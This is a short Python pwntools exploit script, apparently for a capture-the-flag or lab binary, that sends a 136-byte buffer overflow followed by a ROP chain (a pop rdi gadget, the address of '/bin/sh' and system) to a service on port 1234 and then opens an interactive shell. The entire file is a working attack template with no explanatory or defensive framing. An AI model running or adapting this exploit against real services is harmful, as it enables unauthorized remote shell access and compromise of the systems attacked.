from pwn import *

# Addresses
pr = 0x00400793 #pop rdi; ret
binsh = 0x004007bd
system = 0x00400558

context.log_level = 'debug'

# Exploit
def main():

# open process
    r = remote('localhost', 1234)
    #r = remote('192.168.122.76', 1234)
    r.recv()
    r.sendline("160")
    r.recv()
    # exploit
    exploit = "A"*136
    exploit += p64(pr)
    exploit += p64(binsh)
    exploit += p64(system)
    r.sendline(exploit)
    r.interactive()
    
# Main
if __name__ == "__main__":
    main()
